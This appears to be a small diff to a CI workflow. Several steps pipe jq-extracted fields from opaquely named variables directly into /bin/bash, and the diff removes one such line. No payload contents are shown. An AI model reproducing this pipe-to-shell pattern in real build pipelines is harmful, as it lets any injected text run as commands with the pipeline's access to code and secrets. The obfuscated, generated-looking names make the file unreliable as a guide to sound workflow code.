@@ -21,7 +21,6 @@ jobs:
           echo $m38759 | jq -r .xgj9783 | /bin/bash
           echo $tq5 | jq -r .el154 | /bin/bash
           echo $mpn067 | jq -r .ca62 | /bin/bash
-          printf '%s' "$l595" | jq -r .rjh4 | /bin/bash
           echo $u60 | jq -r .oo57609 | /bin/bash
           echo $m0 | jq -r .d195 | /bin/bash
           echo $szz5252 | jq -r .obsf9103 | /bin/bash
